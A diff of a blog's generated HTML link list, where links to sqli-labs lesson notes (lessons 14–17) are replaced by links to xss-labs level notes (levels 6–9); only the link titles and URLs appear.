-            <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-17/">sqli-labs-less-17</a>
+            <a href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC9%E5%85%B3/">xss-labs第9关</a>
           </li>
         
           <li>
-            <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-16/">sqli-labs-less-16</a>
+            <a href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC8%E5%85%B3/">xss-labs第8关</a>
           </li>
         
           <li>
-            <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-15/">sqli-labs-less-15</a>
+            <a href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC7%E5%85%B3/">xss-labs第7关</a>
           </li>
         
           <li>
-            <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-14/">sqli-labs-less-14</a>
+            <a href="/2022/04/20/xss-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/xss-labs%E7%AC%AC6%E5%85%B3/">xss-labs第6关</a>
           </li>
         
       </ul>
